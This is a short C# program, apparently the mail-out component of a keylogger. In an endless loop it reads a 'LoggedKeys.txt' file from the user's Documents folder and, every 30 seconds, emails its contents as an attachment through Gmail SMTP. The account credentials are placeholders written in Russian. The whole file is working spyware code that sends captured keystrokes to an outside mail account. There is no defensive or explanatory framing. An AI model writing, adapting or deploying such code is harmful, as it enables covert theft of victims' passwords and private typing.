using System;
using System.IO;
using System.Net.Mail;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace MailSender
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(30000);
                SendMail();
            }
        }

        static void SendMail()
        {
            String newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = newFilePath + @"\Info\";
            string newFilePath2 = (@filePath + "LoggedKeys.txt");

            

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            using (MailMessage logMessage = new MailMessage())
            {
                logMessage.From = new MailAddress("логин");
                logMessage.To.Add("логин");
                logMessage.Subject = "Посылка";

                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("логин", "пароль");

                string newFile = File.ReadAllText(newFilePath2);
                System.Threading.Thread.Sleep(2);
                string a = filePath + @"\a.txt";
                using (StreamWriter sw = new StreamWriter(a, true))
                {
                    sw.WriteLine(newFile);

                }
                System.Threading.Thread.Sleep(2);
                logMessage.Attachments.Add(new Attachment(a));

                client.Send(logMessage);  
            }
        }
    }
}
